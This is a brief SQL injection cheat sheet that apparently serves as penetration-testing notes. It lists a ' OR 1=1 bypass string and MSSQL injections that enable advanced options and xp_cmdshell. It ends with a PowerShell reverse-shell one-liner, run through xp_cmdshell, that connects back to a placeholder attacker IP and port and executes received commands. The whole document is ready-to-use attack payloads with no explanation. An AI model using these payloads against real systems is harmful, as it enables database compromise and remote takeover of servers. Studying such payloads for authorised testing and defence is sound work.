# First
```
' OR 1=1;
```

# MSSQL
enabled show advance options
```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
```

enabled xp_cmdshell
```
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

one liner reverseshell
```
' EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''ATTACKER IP'',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'-- -
```